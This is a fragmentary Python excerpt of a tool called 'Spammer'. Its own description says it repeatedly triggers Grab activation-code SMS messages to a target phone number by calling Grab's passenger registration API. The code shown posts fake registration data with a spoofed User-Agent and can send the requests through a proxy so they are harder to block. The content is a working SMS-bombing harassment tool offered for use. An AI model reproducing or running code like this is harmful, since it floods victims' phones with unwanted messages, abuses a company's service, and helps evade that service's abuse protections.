...
class Spammer:
    ...
    def main(self):
        ...
        import argparse
        import thread
        parser = argparse.ArgumentParser(prog='Spammer', description="Spammer is a tool used to send Grab Activation Code (SMS) to a phone number repeatedly. Spammer uses Grab's passenger API.")
                ...
                try:
                    if proxy == None:
                        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,
                         ...
                         'name': 'test',
                         'email': 'mail@mail.com',
                         'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'})
                    else:
                        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,
                         'countryCode': 'ID',
                         'name': 'test',
                         'email': 'mail@mail.com',
                         'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'}, proxies={'http': str(proxy),
                         'https': str(proxy)})
